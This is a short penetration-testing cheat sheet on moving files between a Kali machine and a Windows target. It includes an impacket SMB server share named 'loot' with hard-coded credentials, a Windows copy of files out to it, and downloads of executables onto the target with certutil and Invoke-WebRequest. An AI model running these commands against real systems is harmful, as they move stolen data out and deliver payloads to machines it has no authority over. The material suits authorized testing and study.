# File Transfering & Downloading

## Kali - Windows (SMB Server)

**Kali Machine**

```bash
impacket-smbserver share //tmp/loot -smb2support -username pt -password pt
```

**Windows Machine**

```powershell
net use \\<kali-ip>\share /user:pt pt
copy file.txt \\<kali-ip>\share\
```

## Kali -> Windows

{% tabs %}
{% tab title="certutil" %}
`certutil -urlcache -f http:///file.exe file.exe`
{% endtab %}

{% tab title="powershell" %}
`iwr -uri http://<kali-ip>/file.exe -Outfile file.exe`
{% endtab %}

{% tab title="ssh (windows -> kali)" %}
`scp windows-file.txt parallels@<kali-ip>:/path/to/store`
{% endtab %}
{% endtabs %}

